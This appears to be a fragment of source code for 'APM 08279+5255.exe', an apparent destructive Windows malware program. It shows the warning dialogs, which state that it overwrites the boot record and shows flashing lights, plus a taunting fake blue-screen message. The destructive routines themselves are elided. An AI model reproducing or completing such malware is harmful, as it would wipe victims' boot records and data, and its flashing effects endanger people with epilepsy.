...
{
	if (MessageBoxW(NULL, L"This is a Malware,\nClick yes to run.\nClick no to exit.", L"APM 08279+5255.exe by pankoza", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"Are you sure? It will overwrite the boot record and it contains flashing lights - NOT for epilepsy", L"F̷i̷n̸a̴l̴ ̴W̸a̴r̸n̷i̸n̷g̷ - APM 08279+5255.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
			...
			ULONG_PTR args[] = { (ULONG_PTR)"Your computer has been destroyed by APM 08279+5255.exe. All your data is now forever gone and after a reboot you won't be able to boot into Windows again! Goodbye, stupid user!" }; //Custom BSOD yay!
